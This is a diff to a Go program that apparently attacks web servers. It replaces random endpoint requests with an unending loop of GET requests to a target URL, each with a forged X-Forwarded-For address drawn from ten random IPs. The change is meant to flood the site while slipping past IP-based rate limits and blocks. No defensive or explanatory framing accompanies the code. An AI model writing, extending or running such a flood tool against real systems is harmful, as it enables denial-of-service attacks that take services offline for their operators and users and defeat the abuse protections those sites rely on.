@@ -65,12 +65,26 @@ func main() {
 		fmt.Printf("No endpoints found on %v to atack", urlBase)
 		return
 	}
-	for {
-		// Get a random endpoint from the list
-		endpoint := endpoints[rand.Intn(len(endpoints))]
+	// Generate a list of IP addresses to use for the "X-Forwarded-For" header
+	var ipAddresses []string
+	for i := 0; i < 10; i++ {
+		ipAddress := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+		ipAddresses = append(ipAddresses, ipAddress)
+	}
 
-		// Perform an HTTP GET request to the endpoint
-		response, err := http.Get(endpoint)
+	for {
+		// Get a random IP address from the list
+		ipAddress := ipAddresses[rand.Intn(len(ipAddresses))]
+
+		// Perform an HTTP GET request to the URL base with the custom header
+		req, err := http.NewRequest("GET", urlBase, nil)
+		if err != nil {
+			fmt.Println("Error creating HTTP request:", err)
+			continue
+		}
+		req.Header.Set("X-Forwarded-For", ipAddress)
+		client := &http.Client{}
+		response, err := client.Do(req)
 		if err != nil {
 			fmt.Println("Error performing HTTP request:", err)
 		} else {
